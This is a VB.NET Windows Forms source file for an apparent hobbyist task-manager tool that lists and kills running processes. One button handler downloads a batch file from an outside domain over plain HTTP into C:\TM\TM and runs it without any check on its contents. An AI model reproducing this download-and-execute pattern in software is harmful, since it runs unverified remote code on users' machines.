Public Class Form1
    Public Sub GetProcesses()
        ListBox2.Items.Clear()
        Dim p As Process
        For Each p In Process.GetProcesses
            ListBox2.Items.Add(p.ProcessName)
        Next

    End Sub

    Public Sub killprocess()
        Try
            Dim p As Process
            For Each p In Process.GetProcesses
                If p.ProcessName = ListBox2.SelectedItem Then
                    p.Kill()
                End If
            Next
            MsgBox("Process Killed")
        Catch ex As Exception
            MsgBox("mfw process is not kill")
        End Try
    End Sub





    Private Sub MysticButton3_Click_1(sender As Object, e As EventArgs) Handles MysticButton3.Click
        GetProcesses()
    End Sub

    Private Sub MysticButton4_Click_1(sender As Object, e As EventArgs) Handles MysticButton4.Click
        killprocess()
        GetProcesses()

    End Sub

    Private Sub ListBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox2.SelectedIndexChanged

    End Sub

    Private Sub MysticButton5_Click(sender As Object, e As EventArgs) Handles MysticButton5.Click
        More.Show()
    End Sub

    Private Sub MysticButton6_Click(sender As Object, e As EventArgs) Handles MysticButton6.Click
        'Process.Start("cmd", "/k title Test Process")


        My.Computer.FileSystem.CreateDirectory(
  "C:\TM\TM")

        If System.IO.File.Exists("C:\TM\TM\15.bat") Then
            MsgBox("The file exists")

            System.Diagnostics.Process.Start("C:\TM\TM\15.bat")
        Else
            My.Computer.Network.DownloadFile(
"http://www.imztinoz.pw/TM/15.bat",
"C:\TM\TM\15.bat")
            MsgBox("File Downloaded, Please Try Again Now")
        End If







    End Sub

    Private Sub MysticButton7_Click(sender As Object, e As EventArgs)

    End Sub
End Class
